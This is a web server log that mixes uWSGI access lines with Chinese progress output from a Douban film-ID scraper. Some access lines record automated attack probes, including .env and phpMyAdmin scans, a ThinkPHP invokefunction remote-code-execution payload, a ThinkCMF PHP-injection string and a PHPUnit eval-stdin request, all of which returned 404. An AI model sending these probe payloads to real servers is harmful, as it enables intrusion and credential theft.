[1590681602] ./uwsgi.log reopened.
[pid: 24504|app: 0|req: 218/279] 182.254.52.17 () {36 vars in 566 bytes} [Fri May 29 00:02:01 2020] GET /laravel/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 219/280] 182.254.52.17 () {36 vars in 554 bytes} [Fri May 29 00:13:21 2020] GET /m/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 220/281] 182.254.52.17 () {36 vars in 570 bytes} [Fri May 29 00:16:28 2020] GET /framework/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 221/282] 58.247.212.239 () {36 vars in 563 bytes} [Fri May 29 00:19:41 2020] GET /react/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 222/283] 182.254.52.17 () {36 vars in 560 bytes} [Fri May 29 00:22:19 2020] GET /apps/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 223/284] 182.254.52.17 () {36 vars in 564 bytes} [Fri May 29 00:22:30 2020] GET /engine/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
----------重新启动查找------------
天皇 未匹配到合适id
天皇 无豆瓣id数据，存入列表
草莓之夜 匹配到多个豆瓣id数据，存入列表2 ['10558419', '20018144', '20453041']
夺命追踪 未匹配到合适id
夺命追踪 无豆瓣id数据，存入列表
僵尸 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 224/285] 182.254.52.17 () {36 vars in 572 bytes} [Fri May 29 00:31:25 2020] GET /deployment/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
乱世护宝 未匹配到合适id
乱世护宝 无豆瓣id数据，存入列表
少年当自强 未匹配到合适id
少年当自强 无豆瓣id数据，存入列表
劫案迷云 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 225/286] 61.241.50.63 () {36 vars in 557 bytes} [Fri May 29 00:34:04 2020] GET /web/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
逆光飞翔 未匹配到合适id
逆光飞翔 无豆瓣id数据，存入列表
遗落战境 匹配到多个豆瓣id数据，存入列表2 ['3895511', '26752008']
大野狼和小绵羊的爱情 未匹配到合适id
大野狼和小绵羊的爱情 无豆瓣id数据，存入列表
追踪长尾豹马修 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
妈妈2013 未匹配到合适id
妈妈2013 无豆瓣id数据，存入列表
一座城池 匹配到多个豆瓣id数据，存入列表2 ['11594933', '30163719']
那些年我们在一起 未匹配到合适id
那些年我们在一起 无豆瓣id数据，存入列表
志气 匹配到多个豆瓣id数据，存入列表2 ['11599168', '21334553']
鬼鲨 匹配到多个豆瓣id数据，存入列表2 ['24877008', '24882741']
污垢 匹配到多个豆瓣id数据，存入列表2 ['3785918', '27062700']
屏息 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 226/287] 182.254.52.17 () {36 vars in 528 bytes} [Fri May 29 00:40:00 2020] GET /laravel-artisan/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
醉乡民谣 匹配到多个豆瓣id数据，存入列表2 ['6887029', '25833557']
豆芽 匹配到多个豆瓣id数据，存入列表2 ['25746453', '26592941']
现场直播 未匹配到合适id
现场直播 无豆瓣id数据，存入列表
狄仁杰之神都龙王同声评论版 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
科学小飞侠 匹配到多个豆瓣id数据，存入列表2 ['23713228', '20017314']
她爱上了我的谎 匹配到多个豆瓣id数据，存入列表2 ['10521712', '25768250']
天注定 未匹配到合适id
天注定 无豆瓣id数据，存入列表
亲情接力 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 227/288] 182.254.52.17 () {36 vars in 566 bytes} [Fri May 29 00:45:43 2020] GET /scripts/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
僵尸世界大战 匹配到多个豆瓣id数据，存入列表2 ['2132473', '25729323']
古惑仔：江湖新秩序 未匹配到合适id
古惑仔：江湖新秩序 无豆瓣id数据，存入列表
逆袭 (2013) 未匹配到合适id
逆袭 (2013) 无豆瓣id数据，存入列表
毛泽东与齐白石 未匹配到合适id
毛泽东与齐白石 无豆瓣id数据，存入列表
金刚狼2 匹配到多个豆瓣id数据，存入列表2 ['3718424', '26853706']
色衰应召男 10537891 7.0保存成功[douban]
夜色行动 匹配到多个豆瓣id数据，存入列表2 ['6815094', '23752714']
星际迷航12：暗黑无界 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 228/289] 35.230.98.148 () {30 vars in 397 bytes} [Fri May 29 00:51:17 2020] GET /7d01b98ebc13a5b4ff8fb999c841dc16.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24507|app: 0|req: 48/290] 35.230.98.148 () {30 vars in 397 bytes} [Fri May 29 00:51:17 2020] GET /87041BFEA9CBCD27FDD0B2F45B737314.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24507|app: 0|req: 49/291] 35.230.98.148 () {30 vars in 397 bytes} [Fri May 29 00:51:17 2020] GET /142f72019210affb5fdb61780df96e63.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24506|app: 0|req: 9/292] 35.230.98.148 () {30 vars in 365 bytes} [Fri May 29 00:51:17 2020] GET /phpmyadmin/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24506|app: 0|req: 10/293] 35.230.98.148 () {30 vars in 365 bytes} [Fri May 29 00:51:17 2020] GET /phpMyAdmin/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
环太平洋 匹配到多个豆瓣id数据，存入列表2 ['5323968', '30177323', '24706498']
极速风流 6803494 8.8保存成功[douban]
上位 未匹配到合适id
上位 无豆瓣id数据，存入列表
虎胆龙威5 匹配到多个豆瓣id数据，存入列表2 ['4312428', '26302913']
世界末日 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 229/294] 198.108.66.244 () {34 vars in 394 bytes} [Fri May 29 00:52:21 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 230/295] 182.254.52.17 () {36 vars in 520 bytes} [Fri May 29 00:54:20 2020] GET /development/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
我们都是坏孩子 未匹配到合适id
我们都是坏孩子 无豆瓣id数据，存入列表
三十二 未匹配到合适id
三十二 无豆瓣id数据，存入列表
愤怒的小孩 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
荣誉至上 未匹配到合适id
荣誉至上 无豆瓣id数据，存入列表
神奇 未匹配到合适id
神奇 无豆瓣id数据，存入列表
毛泽东与齐白石 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
越位者 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 231/296] 182.254.52.17 () {36 vars in 570 bytes} [Fri May 29 01:03:05 2020] GET /protected/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 232/297] 182.254.52.17 () {36 vars in 564 bytes} [Fri May 29 01:03:11 2020] GET /docker/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 233/298] 182.254.52.17 () {36 vars in 551 bytes} [Fri May 29 01:03:22 2020] GET /solr/admin/info/system?wt%3Djson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
夺宝联盟 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 234/299] 58.247.212.239 () {36 vars in 505 bytes} [Fri May 29 01:08:46 2020] GET /cli/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 235/300] 182.254.52.17 () {36 vars in 564 bytes} [Fri May 29 01:17:25 2020] GET /shared/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 236/301] 182.254.52.17 () {36 vars in 558 bytes} [Fri May 29 01:20:41 2020] GET /src/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 237/302] 93.140.137.117 () {32 vars in 464 bytes} [Fri May 29 01:21:31 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 238/303] 182.254.52.17 () {36 vars in 560 bytes} [Fri May 29 01:26:53 2020] GET /auth/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 239/304] 182.254.52.17 () {36 vars in 566 bytes} [Fri May 29 01:35:13 2020] GET /project/.env => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
----------重新启动查找------------
招魂2013 未匹配到合适id
----------地址被限制,稍后重试----------
快乐到家 未匹配到合适id
----------地址被限制,稍后重试----------
对面的女孩杀过来 未匹配到合适id
----------地址被限制,稍后重试----------
青春派 未匹配到合适id
----------地址被限制,稍后重试----------
小时代 未匹配到合适id
----------地址被限制,稍后重试----------
-----连续十次失败，等待1小时-----
一路狂奔 未匹配到合适id
----------地址被限制,稍后重试----------
夜来香 未匹配到合适id
----------地址被限制,稍后重试----------
爱可以走多久 未匹配到合适id
----------地址被限制,稍后重试----------
致命黑兰 未匹配到合适id
----------地址被限制,稍后重试----------
成成烽火之绝杀 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 240/305] 182.254.52.17 () {36 vars in 642 bytes} [Fri May 29 03:08:15 2020] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 241/306] 182.254.52.17 () {36 vars in 592 bytes} [Fri May 29 03:14:19 2020] GET /video/play/84919/1-8.html => generated 14825 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
----------重新启动查找------------
成成烽火之较量 未匹配到合适id
----------地址被限制,稍后重试----------
午夜微博 未匹配到合适id
----------地址被限制,稍后重试----------
血乳交融 未匹配到合适id
----------地址被限制,稍后重试----------
捉迷藏2013 未匹配到合适id
----------地址被限制,稍后重试----------
回到原点 未匹配到合适id
----------地址被限制,稍后重试----------
-----连续十次失败，等待1小时-----
[pid: 24504|app: 0|req: 242/307] 210.4.69.138 () {32 vars in 462 bytes} [Fri May 29 04:35:28 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 243/308] 182.254.52.17 () {36 vars in 574 bytes} [Fri May 29 04:39:04 2020] GET /admin/login.html => generated 5348 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 1)
私奔B计划 未匹配到合适id
----------地址被限制,稍后重试----------
征服者 未匹配到合适id
----------地址被限制,稍后重试----------
汽车旅馆人生 未匹配到合适id
----------地址被限制,稍后重试----------
盲凶 未匹配到合适id
----------地址被限制,稍后重试----------
机械师 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 244/309] 185.180.131.207 () {32 vars in 472 bytes} [Fri May 29 05:16:13 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.0 404) 4 headers in 128 bytes (1 switches on core 1)
----------重新启动查找------------
雇佣军 未匹配到合适id
----------地址被限制,稍后重试----------
执法风云 未匹配到合适id
----------地址被限制,稍后重试----------
布鲁克 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 245/310] 182.254.52.17 () {36 vars in 560 bytes} [Fri May 29 05:45:30 2020] GET /streaming => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
小混混们的战争 未匹配到合适id
----------地址被限制,稍后重试----------
鼠胆杀手 未匹配到合适id
----------地址被限制,稍后重试----------
-----连续十次失败，等待1小时-----
[pid: 24504|app: 0|req: 246/311] 61.241.50.63 () {36 vars in 593 bytes} [Fri May 29 05:54:40 2020] GET /streaming/clients_live.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 247/312] 195.54.160.130 () {34 vars in 556 bytes} [Fri May 29 06:01:15 2020] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 248/313] 143.137.150.5 () {32 vars in 470 bytes} [Fri May 29 06:05:13 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 249/314] 195.54.160.130 () {36 vars in 653 bytes} [Fri May 29 06:09:36 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24507|app: 0|req: 50/315] 195.54.160.130 () {34 vars in 556 bytes} [Fri May 29 06:09:37 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 250/316] 195.54.160.130 () {34 vars in 716 bytes} [Fri May 29 06:24:11 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
死亡迷局 5342081 3.6保存成功[douban]
屠龙者的黎明 未匹配到合适id
屠龙者的黎明 无豆瓣id数据，存入列表
热血无赖 10355338 7.3保存成功[douban]
迈阿密行动 未匹配到合适id
迈阿密行动 无豆瓣id数据，存入列表
我是中国人 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
乌鸦 匹配到多个豆瓣id数据，存入列表2 ['6889533', '3914547']
友情岁月2012 未匹配到合适id
友情岁月2012 无豆瓣id数据，存入列表
寿司女郎 未匹配到合适id
寿司女郎 无豆瓣id数据，存入列表
拳皇 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 251/317] 182.254.52.17 () {36 vars in 572 bytes} [Fri May 29 06:56:15 2020] GET /admin/view_log/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 6 headers in 180 bytes (1 switches on core 1)
[pid: 24507|app: 0|req: 51/318] 182.254.52.17 () {38 vars in 626 bytes} [Fri May 29 06:56:15 2020] GET /admin/login.html => generated 5348 bytes in 1 msecs (HTTP/1.1 200) 6 headers in 319 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 252/319] 182.254.52.17 () {36 vars in 570 bytes} [Fri May 29 06:58:16 2020] GET /system_api.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
纽约行动 未匹配到合适id
纽约行动 无豆瓣id数据，存入列表
死亡降临 未匹配到合适id
死亡降临 无豆瓣id数据，存入列表
全面回忆2012 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
非常小特务4 未匹配到合适id
非常小特务4 无豆瓣id数据，存入列表
再也不绑架了 未匹配到合适id
再也不绑架了 无豆瓣id数据，存入列表
和平、爱与误解 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
美男计 未匹配到合适id
美男计 无豆瓣id数据，存入列表
自古英雄出少年之岳飞 未匹配到合适id
自古英雄出少年之岳飞 无豆瓣id数据，存入列表
救赎 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
如果我们生活在一起 未匹配到合适id
如果我们生活在一起 无豆瓣id数据，存入列表
鬼屋惊魂2012 未匹配到合适id
鬼屋惊魂2012 无豆瓣id数据，存入列表
结婚前夜2012 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 253/320] 58.247.212.239 () {36 vars in 577 bytes} [Fri May 29 07:23:29 2020] GET /stalker_portal/c/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 254/321] 45.76.144.219 () {36 vars in 432 bytes} [Fri May 29 07:40:13 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
----------重新启动查找------------
摩天楼 匹配到多个豆瓣id数据，存入列表2 ['5968834', '11632383']
幸存日2012 未匹配到合适id
幸存日2012 无豆瓣id数据，存入列表
海豹六队突袭乌萨马本拉登 未匹配到合适id
海豹六队突袭乌萨马本拉登 无豆瓣id数据，存入列表
叛谍追击 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
土耳其语入门 匹配到多个豆瓣id数据，存入列表2 ['6999845', '26337864']
无法无天2012 未匹配到合适id
无法无天2012 无豆瓣id数据，存入列表
小十三 未匹配到合适id
小十三 无豆瓣id数据，存入列表
超级明星 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
乡下人 未匹配到合适id
乡下人 无豆瓣id数据，存入列表
决战豪门2 未匹配到合适id
决战豪门2 无豆瓣id数据，存入列表
草食男之桃花期 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
3星大厨 未匹配到合适id
3星大厨 无豆瓣id数据，存入列表
以暴制暴 未匹配到合适id
以暴制暴 无豆瓣id数据，存入列表
缘来是咱俩 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 255/322] 182.254.52.17 () {36 vars in 621 bytes} [Fri May 29 07:50:39 2020] GET /video/type/1/?%26rating%3D9.0%26page%3D2 => generated 37640 bytes in 244 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
非常小特工之时间大盗 未匹配到合适id
非常小特工之时间大盗 无豆瓣id数据，存入列表
兵临城下之决战要塞 未匹配到合适id
兵临城下之决战要塞 无豆瓣id数据，存入列表
恒山月光 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
HOLD住爱 匹配到多个豆瓣id数据，存入列表2 ['10539139', '19971643']
一九四二 匹配到多个豆瓣id数据，存入列表2 ['6011805', '20431591']
超凡蜘蛛侠 匹配到多个豆瓣id数据，存入列表2 ['2129132', '34869225']
应召女郎之死 未匹配到合适id
应召女郎之死 无豆瓣id数据，存入列表
完美计划 匹配到多个豆瓣id数据，存入列表2 ['10463991', '10520357']
蓝色老虎 匹配到多个豆瓣id数据，存入列表2 ['10539605', '20259045']
大上海 匹配到多个豆瓣id数据，存入列表2 ['10540066', '25741578']
月升王国 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
白鹿原 匹配到多个豆瓣id数据，存入列表2 ['4718369', '11593592']
铁拳/铁拳无敌 未匹配到合适id
铁拳/铁拳无敌 无豆瓣id数据，存入列表
独裁者 未匹配到合适id
独裁者 无豆瓣id数据，存入列表
罗马浴场 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
延安往事 未匹配到合适id
延安往事 无豆瓣id数据，存入列表
泰迪熊 匹配到多个豆瓣id数据，存入列表2 ['4807924', '7015749']
青春期3 未匹配到合适id
青春期3 无豆瓣id数据，存入列表
我和你/折翼小天使 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 256/323] 103.149.192.61 () {34 vars in 488 bytes} [Fri May 29 08:03:09 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
黑衣人3 匹配到多个豆瓣id数据，存入列表2 ['3642835', '34851332']
喜爱夜蒲2 未匹配到合适id
喜爱夜蒲2 无豆瓣id数据，存入列表
匹夫 匹配到多个豆瓣id数据，存入列表2 ['10508901', '21268222']
诈欺游戏再生 匹配到多个豆瓣id数据，存入列表2 ['6872245', '10531279', '19961098']
壳中裂缝 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
爱love 未匹配到合适id
爱love 无豆瓣id数据，存入列表
桃姐 未匹配到合适id
桃姐 无豆瓣id数据，存入列表
寒战 匹配到多个豆瓣id数据，存入列表2 ['6890730', '27012800']
人山人海 未匹配到合适id
人山人海 无豆瓣id数据，存入列表
真心话大冒险 匹配到多个豆瓣id数据，存入列表2 ['6061437', '4942779']
一九四二 匹配到多个豆瓣id数据，存入列表2 ['6011805', '20431591']
乐翻天 匹配到多个豆瓣id数据，存入列表2 ['6946772', '6514136']
鹭语 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
非常之恋 未匹配到合适id
非常之恋 无豆瓣id数据，存入列表
昨日的记忆 未匹配到合适id
昨日的记忆 无豆瓣id数据，存入列表
微博有鬼之炸弹炸弹 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 257/324] 177.105.225.228 () {32 vars in 465 bytes} [Fri May 29 08:13:01 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
娜娜 未匹配到合适id
娜娜 无豆瓣id数据，存入列表
国王的演讲 未匹配到合适id
国王的演讲 无豆瓣id数据，存入列表
我愿意 匹配到多个豆瓣id数据，存入列表2 ['6782006', '10769695']
人狼大战 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
鬼娃回魂5 未匹配到合适id
鬼娃回魂5 无豆瓣id数据，存入列表
洪吉童的后裔 未匹配到合适id
洪吉童的后裔 无豆瓣id数据，存入列表
死亡录像3：起源 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
麒麟之翼 未匹配到合适id
麒麟之翼 无豆瓣id数据，存入列表
三个火枪手 未匹配到合适id
三个火枪手 无豆瓣id数据，存入列表
雨果 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
复仇者联盟 未匹配到合适id
----------地址被限制,稍后重试----------
杰西警探：失踪的无辜者 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 258/325] 182.254.52.17 () {36 vars in 621 bytes} [Fri May 29 08:30:22 2020] GET /video/type/1/?%26rating%3D8.0%26page%3D8 => generated 37640 bytes in 252 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 259/326] 182.254.52.17 () {36 vars in 621 bytes} [Fri May 29 08:34:27 2020] GET /video/type/1/?%26rating%3D8.0%26page%3D9 => generated 37640 bytes in 253 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
----------重新启动查找------------
在乎你 在乎我 6018999 5.6保存成功[douban]
心脏跳动 未匹配到合适id
心脏跳动 无豆瓣id数据，存入列表
十字追杀令 3011030 3.5保存成功[douban]
武术战士 4324508 3.1保存成功[douban]
耶路撒冷 未匹配到合适id
耶路撒冷 无豆瓣id数据，存入列表
塞班 未匹配到合适id
塞班 无豆瓣id数据，存入列表
危情英雄 10441178 0保存成功[douban]
好汉杨炽 21355839 0保存成功[douban]
黑暗终结者 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
角斗士王国 6861480 3.1保存成功[douban]
迷宫下的罪恶 未匹配到合适id
迷宫下的罪恶 无豆瓣id数据，存入列表
雨水危机 未匹配到合适id
雨水危机 无豆瓣id数据，存入列表
致命格斗 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
爱情尸检报告 6506809 7.4保存成功[douban]
百草奇缘 6534066 0保存成功[douban]
保卫战队之出动喇！朋友！ 6041201 5.8保存成功[douban]
边界营救行动 5907603 5.5保存成功[douban]
送信者 未匹配到合适id
----------地址被限制,稍后重试----------
青春暴力史 未匹配到合适id
青春暴力史 无豆瓣id数据，存入列表
热血新仔2僵尸危机 未匹配到合适id
热血新仔2僵尸危机 无豆瓣id数据，存入列表
肉体创伤 6524192 3.0保存成功[douban]
多浪迪警官4致命危机 未匹配到合适id
多浪迪警官4致命危机 无豆瓣id数据，存入列表
龙门飞甲 匹配到多个豆瓣id数据，存入列表2 ['4896304', '7163193']
怪物小王子 匹配到多个豆瓣id数据，存入列表2 ['6807440', '6087770']
偷窥的世界 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
甘地到希特勒 6847702 3.7保存成功[douban]
怪物马特 未匹配到合适id
怪物马特 无豆瓣id数据，存入列表
婚前特急 匹配到多个豆瓣id数据，存入列表2 ['4853689', '6759194', '6866788']
西方就是西方 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
幸运2011 未匹配到合适id
幸运2011 无豆瓣id数据，存入列表
美味家庭 未匹配到合适id
美味家庭 无豆瓣id数据，存入列表
做生意的男孩 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
保持冷静 未匹配到合适id
保持冷静 无豆瓣id数据，存入列表
维京小海盗2 未匹配到合适id
维京小海盗2 无豆瓣id数据，存入列表
曾几何时 匹配到多个豆瓣id数据，存入列表2 ['6225090', '5332563', '6523545', '10465109']
幸福的黄手帕2011 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
小丑漫游记 6958379 7.6保存成功[douban]
氪星石2011 未匹配到合适id
氪星石2011 无豆瓣id数据，存入列表
幸存日2011 未匹配到合适id
幸存日2011 无豆瓣id数据，存入列表
宇宙英雄之超银河传说 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
火辣大电影 未匹配到合适id
火辣大电影 无豆瓣id数据，存入列表
下流女孩 未匹配到合适id
下流女孩 无豆瓣id数据，存入列表
橘子 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
战国 匹配到多个豆瓣id数据，存入列表2 ['4707585', '5392152']
纳尼亚传奇3：黎明踏浪号 未匹配到合适id
纳尼亚传奇3：黎明踏浪号 无豆瓣id数据，存入列表
平行宇宙2011：噩梦星球 未匹配到合适id
平行宇宙2011：噩梦星球 无豆瓣id数据，存入列表
小红帽2011 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
深度谜案 未匹配到合适id
深度谜案 无豆瓣id数据，存入列表
刑柱之地 未匹配到合适id
刑柱之地 无豆瓣id数据，存入列表
觉醒 匹配到多个豆瓣id数据，存入列表2 ['5258036', '6129631']
爱，不爱 匹配到多个豆瓣id数据，存入列表2 ['5912977', '6527170', '6129693']
[pid: 24504|app: 0|req: 260/327] 195.54.160.130 () {38 vars in 610 bytes} [Fri May 29 09:33:07 2020] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
决战洛杉矶 未匹配到合适id
决战洛杉矶 无豆瓣id数据，存入列表
非法入侵 匹配到多个豆瓣id数据，存入列表2 ['4919232', '10567048']
夺面煞星宝莱坞2 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 261/328] 182.254.52.17 () {36 vars in 542 bytes} [Fri May 29 09:33:29 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
黄沙武士 未匹配到合适id
黄沙武士 无豆瓣id数据，存入列表
克隆丈夫 未匹配到合适id
克隆丈夫 无豆瓣id数据，存入列表
狙踪前度 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
真爱至上 匹配到多个豆瓣id数据，存入列表2 ['11612470', '10565156']
咖啡 未匹配到合适id
咖啡 无豆瓣id数据，存入列表
哈利波特7：死亡圣器(下) 未匹配到合适id
哈利波特7：死亡圣器(下) 无豆瓣id数据，存入列表
蓝精灵 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
河豚 未匹配到合适id
----------地址被限制,稍后重试----------
寻人奇事 未匹配到合适id
----------地址被限制,稍后重试----------
青春期2：青春失乐园 未匹配到合适id
----------地址被限制,稍后重试----------
孩子们 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
